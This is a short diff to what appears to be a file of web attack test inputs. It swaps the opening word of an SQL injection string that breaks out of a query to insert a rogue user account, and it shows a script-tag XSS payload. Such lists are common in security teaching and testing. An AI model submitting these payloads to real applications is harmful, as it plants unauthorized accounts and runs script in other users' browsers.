@@ -1,5 +1,5 @@
 SQL Injection:
-pass'); INSERT INTO users (fname, lname, email, username, password) VALUES ('Malicious', 'Attacker', 'attacker@malicious_blog.com', 'mal', 'hack
+test'); INSERT INTO users (fname, lname, email, username, password) VALUES ('Malicious', 'Attacker', 'attacker@malicious_blog.com', 'mal', 'hack
 
 XSS:
 First<script>alert("Hacked!")</script>
